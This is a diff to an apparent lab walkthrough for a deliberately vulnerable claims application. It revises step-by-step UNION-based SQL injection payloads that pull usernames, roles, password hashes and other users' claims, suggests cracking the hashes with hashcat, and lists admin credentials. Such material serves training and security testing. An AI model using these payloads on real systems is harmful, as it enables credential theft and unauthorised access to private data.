@@ -68,38 +68,52 @@ Go to **Search Claims** (`/search-claims`).
 
 ### Step 3 — Determine the column count
 
-To perform a `UNION`-based injection, the number of columns in the injected `SELECT` must match the original query (12 columns). Confirm this by testing:
+The search input is inserted into the SQL query **twice** (for `title LIKE` and `description LIKE`). The `--` comment operator neutralises everything after it on the same line, so only the first occurrence matters.
+
+To perform a `UNION`-based injection, the number of columns must match the original query (12 columns). Test with:
 
 ```
-' UNION SELECT null,null,null,null,null,null,null,null,null,null,null,null --
+x' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12 -- 
 ```
+
+> **Important:** Make sure to include a trailing space after `--`. PostgreSQL requires it for the comment to be valid.
 
 If the page loads without a "Query error" flash message, the column count is correct.
 
-### Step 4 — Extract user credentials
+### Step 4 — Extract usernames and roles
 
 Enter the following payload in the search box:
 
 ```
-' UNION SELECT id, username, email, password_hash, role, null, null, null, null, null, null, null FROM users --
+x' UNION SELECT id, username, email, username, role, 0.0, role, created_at, created_at, NULL, NULL, NULL FROM users -- 
 ```
 
-This maps the `users` table columns to the output positions the template renders:
+This maps user data to the columns the template renders:
 
-| Template column | Displays       | `users` value     |
-|-----------------|----------------|-------------------|
-| ID (`row[0]`)   | User ID        | `id`              |
-| Title (`row[3]`)| **Username**   | `username`        |
-| Amount (`row[5]`)| **Password hash** | `password_hash` |
-| Status (`row[6]`)| **Role**       | `role`            |
-| Submitted (`row[7]`)| Email     | (not mapped here) |
+| Template column | Displays       | `users` value      |
+|-----------------|----------------|--------------------|
+| ID (`row[0]`)   | User ID        | `id`               |
+| Title (`row[3]`)| **Username**   | `username`         |
+| Amount (`row[5]`)| `0.0` placeholder (avoids template format error) | `0.0` |
+| Status (`row[6]`)| **Role**       | `role`             |
+| Submitted (`row[7]`)| **Created at** | `created_at`   |
+
+### Step 5 — Extract password hashes (separate query)
+
+The password hash column cannot be placed in the Amount position (`row[5]`) because the template tries to format it as a float (`"%.2f"|format(row[5])`). Use this separate payload to extract hashes:
+
+```
+x' UNION SELECT id, username, email, password_hash, created_at::text, NULL, NULL, password_hash, NULL, NULL, NULL, NULL FROM users -- 
+```
+
+This places `password_hash` in the `additional_details` position (`row[7]`), which renders as plain text in the Submitted column.
 
 > Note: The `password_hash` values are Werkzeug hashed passwords (e.g., `scrypt:32768:8:1$...`). Use an offline hash cracker (e.g., hashcat with mode 25600 for Werkzeug scrypt) to recover plaintext passwords.
 
-### Step 5 — Extract all claims from other users
+### Step 6 — Extract all claims from other users
 
 ```
-' UNION SELECT id, user_id, claim_type_id, title, description, amount, status, additional_details, created_at, updated_at, reviewed_by, review_notes FROM claims WHERE user_id != 1 --
+x' UNION SELECT id, user_id, claim_type_id, title, description, amount, status, additional_details, created_at, updated_at, reviewed_by, review_notes FROM claims WHERE user_id != 1 -- 
 ```
 
 This returns claims belonging to all other users.
@@ -113,14 +127,6 @@ Once the OIC password hash is cracked, log in at `/login` with the recovered cre
 Username: oic_admin
 Password: oic_admin_pass
 ```
-
----
-
-## Impact
-
-- **Credential theft** — extract password hashes from the `users` table and crack them offline.
-- **Data exfiltration** — read all claims from other users, bypassing the per-user access restriction.
-- **Privilege escalation** — use stolen OIC credentials to log in and perform privileged actions (approve/reject claims, manage claim types, edit notification templates).
 
 ---
 
